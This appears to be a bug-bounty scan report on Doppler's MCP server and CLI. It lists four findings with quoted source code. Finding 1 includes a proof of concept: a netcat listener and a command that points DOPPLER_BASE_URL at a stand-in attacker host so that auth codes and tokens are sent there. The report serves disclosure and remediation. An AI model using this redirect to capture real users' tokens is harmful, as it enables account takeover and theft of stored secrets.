# Doppler Quick Scan Report

**Date**: 2026-09-01  
**Target**: Doppler (HackerOne)  
**Score**: 66  
**Platform**: api.doppler.com, dashboard.doppler.com, CLI (github.com/DopplerHQ/cli)

---

## Executive Summary

Doppler is a secrets management platform with an active HackerOne bug bounty program (bounties $250-$10,000). The scan focused on the open-source MCP server, CLI, and API endpoints. One promising vulnerability class identified: **Token Theft via DOPPLER_BASE_URL Environment Variable** in the MCP server.

---

## Finding 1: Token Theft via DOPPLER_BASE_URL Environment Variable

**Severity**: Medium-High (CVSS ~7.5)  
**File**: `src/auth.ts`, `src/token-cache.ts`  
**Component**: Doppler MCP Server (`@dopplerhq/mcp-server`)

### Description

The Doppler MCP server accepts a `DOPPLER_BASE_URL` environment variable that redirects all API calls, including authentication token exchange, to an attacker-controlled server. If an attacker can control this environment variable (e.g., via shared CI/CD environment, malicious .env file, or supply chain attack), they can steal Doppler tokens.

### Vulnerability Details

1. **Token Sent to Arbitrary Base URL**: In `src/auth.ts:38-41`:
   ```typescript
   this.config = {
     token: token ?? null,
     baseUrl: baseUrl || process.env.DOPPLER_BASE_URL || "https://api.doppler.com",
   };
   ```

2. **Auth Code Exchange Uses Custom Base URL**: In `src/device-auth.ts:35-52`:
   ```typescript
   const url = `${baseUrl}/v3/auth/cli/generate/2?${params.toString()}`;
   // ...
   const url = `${baseUrl}/v3/auth/cli/authorize`;
   ```

3. **Token Cache Loads From Environment**: In `src/token-cache.ts:13-18`:
   ```typescript
   const envToken = process.env.DOPPLER_TOKEN;
   if (envToken) {
     return {
       token: envToken,
       apiHost: process.env.DOPPLER_BASE_URL || "https://api.doppler.com",
     };
   }
   ```

### Attack Scenario

1. Attacker creates a malicious server at `https://evil-doppler.com`
2. Attacker sets `DOPPLER_BASE_URL=https://evil-doppler.com` in a shared environment
3. When a user runs `npx @dopplerhq/mcp-server login`, the auth code is sent to attacker's server
4. Attacker's server captures the auth code and exchanges it for a valid Doppler token
5. Attacker now has full access to the user's Doppler secrets

### PoC

```bash
# On attacker's server (e.g., using netcat or simple HTTP server)
nc -l -p 443

# In victim's environment
DOPPLER_BASE_URL=https://evil-doppler.com npx @dopplerhq/mcp-server login

# Attacker receives the auth code and can exchange it for a token
```

### Impact

- Full account takeover
- Access to all secrets managed by Doppler
- Potential lateral movement to other systems using leaked secrets

### Recommendation

1. Validate that `DOPPLER_BASE_URL` points to a Doppler-owned domain
2. Add certificate pinning for the auth endpoint
3. Warn users when using a non-default base URL

---

## Finding 2: Information Disclosure via Hostname in Device Auth

**Severity**: Low (CVSS ~3.5)  
**File**: `src/device-auth.ts:30-36`

### Description

The device auth flow sends hostname, OS type, and architecture to the auth endpoint:

```typescript
const params = new URLSearchParams({
  hostname,
  version: CLI_VERSION,
  os: osType,
  arch,
  client_type: "mcp",
});
```

### Impact

- Reconnaissance information leakage
- Could be used for targeted attacks

---

## Finding 3: Weak Token Format Validation

**Severity**: Low (CVSS ~2.5)  
**File**: `src/auth.ts:59-67`

### Description

Token validation only checks if the token starts with "dp." prefix:

```typescript
public static validateToken(token: string): { valid: boolean; errors: string[] } {
  const errors: string[] = [];
  if (!token) {
    errors.push("Token is empty");
  } else if (!token.startsWith("dp.")) {
    errors.push("Token does not appear to be a valid Doppler token format");
  }
  return {
    valid: errors.length === 0,
    errors,
  };
}
```

### Impact

- Accepts malformed tokens
- Could lead to unexpected behavior

---

## Finding 4: Arbitrary Input Passthrough in Tool Execution

**Severity**: Low-Medium (CVSS ~4.0)  
**File**: `src/generator.ts:95-107`

### Description

The tool generator passes through arbitrary properties to the API body without validation:

```typescript
// Include all input properties that aren't path/query params
// This allows arbitrary properties (like custom secret names) to pass through
for (const [key, value] of Object.entries(input)) {
  const isPathOrQueryParam = key in pathParams || key in queryParams;
  if (!isPathOrQueryParam && value !== undefined) {
    bodyData[key] = value;
  }
}
```

### Impact

- Potential for parameter injection
- Could bypass intended API constraints

---

## Attack Surface Summary

| Asset | Type | In Scope | Bounty |
|-------|------|----------|--------|
| api.doppler.com | URL | Yes | Yes |
| dashboard.doppler.com | URL | Yes | Yes |
| CLI binary | Executable | Yes | Yes |
| github.com/DopplerHQ/cli | Source Code | Yes | Yes |
| doppler.team | URL | Yes | Yes |
| share.doppler.com | URL | Yes | Yes |

---

## Next Steps

1. **Test Finding 1**: Verify if `DOPPLER_BASE_URL` validation can be bypassed
2. **Test Finding 4**: Attempt parameter injection via MCP tools
3. **API Testing**: Test for IDOR on project/config endpoints
4. **CLI Review**: Examine CLI for command injection vectors

---

## References

- [Doppler HackerOne Program](https://hackerone.com/doppler)
- [Doppler MCP Server](https://github.com/DopplerHQ/mcp-server)
- [Doppler CLI](https://github.com/DopplerHQ/cli)
- [Doppler API Documentation](https://docs.doppler.com/reference/api)
